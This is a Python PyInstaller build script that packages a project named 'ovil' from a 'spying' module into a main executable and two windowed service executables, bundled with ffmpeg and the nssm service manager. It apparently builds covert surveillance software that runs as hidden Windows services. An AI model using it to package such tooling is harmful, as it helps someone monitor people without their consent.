# run this to compile from the code directory to compile the code from source
# Note: You can pass it the result path through the command line or in the FINAL_RESULT_DIR variable
import subprocess
import sys
from pathlib import Path
from shutil import rmtree, copytree, move, copy
from spying.consts import PROJECT_NAME, SERVICE_NAME
DEBUG = True
FINAL_RESULT_DIR = ".\\final"


def create_ovil():
    ovil_dir = Path(FINAL_RESULT_DIR) / "ovil"
    ovil_dir.mkdir()
    command = ["pyinstaller",
               "--noconfirm",
               "--onefile",
               "--console" if DEBUG else "--windowed",
               "--icon",
               r"gui/static/imgs/favicon.ico",
               r"main.py"
               ]
    subprocess.run(command)
    dist = Path("dist")
    move(dist / "main.exe", ovil_dir / f"{PROJECT_NAME}.exe")
    copy("ffmpeg.exe", ovil_dir / "ffmpeg.exe")
    copy("nssm.exe", ovil_dir / "nssm.exe")
    command = ["pyinstaller",
               "--noconfirm",
               "--onefile",
               "--windowed",
               "--icon",
               r"gui/static/imgs/favicon.ico",
               r"spying/service1.py"
               ]
    subprocess.run(command)
    command = ["pyinstaller",
               "--noconfirm",
               "--onefile",
               "--windowed",
               "--icon",
               r"gui/static/imgs/favicon.ico",
               r"spying/service2.py"
               ]
    subprocess.run(command)
    move(dist / "service1.exe", ovil_dir / f"{SERVICE_NAME}1.exe")
    move(dist / "service2.exe", ovil_dir / f"{SERVICE_NAME}2.exe")
    rmtree("build")
    rmtree("dist")


def create_server():
    server_dir = Path(FINAL_RESULT_DIR) / "server"
    # server_dir.mkdir()
    # copytree(r".\static", str(server_dir / "static"))
    # copytree(r".\templates", str(server_dir / "static"))
    command = ["--noconfirm",
               "--onedir",
               "--windowed",
               "--add-data", str(server_dir / "templates") + ";templates/",
               "--add-data", str(server_dir / "static") + ";static",
               r".\gui\gui.py"
               ]


def main():
    global FINAL_RESULT_DIR
    if len(sys.argv) == 2:
        FINAL_RESULT_DIR = sys.argv[1]
    elif len(sys.argv) > 2:
        print("Invalid number of params. try add ' to your path")
        exit(0)
    final_dir = Path(FINAL_RESULT_DIR)
    rmtree(str(final_dir))
    final_dir.mkdir(parents=True, exist_ok=False)
    create_ovil()
    # create_server()

# TODO: finish this


if __name__ == "__main__":
    main()